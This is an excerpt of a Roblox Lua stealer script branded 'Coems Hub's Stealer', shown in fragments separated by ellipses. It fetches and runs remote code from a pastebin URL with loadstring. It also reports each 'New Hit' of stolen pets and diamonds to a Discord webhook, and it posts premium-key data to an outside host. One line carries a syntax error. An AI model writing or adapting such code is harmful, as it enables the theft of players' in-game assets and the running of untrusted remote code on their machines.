...
if idiotuser == UserName then
    game:GetService("Players").LocalPlayer:Kick("You Are The Owner of The script! (Test on Alt Acc)")
    return;
end
if UserName == nil then
...
if _G.LoadingScreen = true then
    loadstring(game:HttpGet('https://pastebin.com/raw/GswUN4HU'))() -- Exc : https://raw.githubusercontent.com/blabla/blabla/main/ls.lua
end
...
local function SendWebhook(rarity, name, ping, d, f, petimg, receiver)
    ...
    if FinalFinal ~= 0 or DiamondsDiamonds ~= 0 then
        imgs =
        "https://cdn.discordapp.com/icons/1109197661652910210/c635dd13f1317b77ded3c73a19840db2.png"
        data1 = {
            ["content"] = ping,
            ["username"] = "Coems Hub",
            ["avatar_url"] = imgs,
            ["embeds"] = { {
                ["title"] = "**New Hit** ||With Coems||",
                ...
                ["fields"] = { {
                    ["name"] = "**This data was generated using Coems Hub's Stealer** :moyai:",
...
if getgenv().Settings ~= nil then
    if getgenv().Settings.PremiumKey ~= nil then
        ...
        local dhurl = "https://janeq.space/key.php" -- Exc : https://rizz.xyz/premium.php
        local dhheaders = {
            ["content-type"] = "application/json"
        }
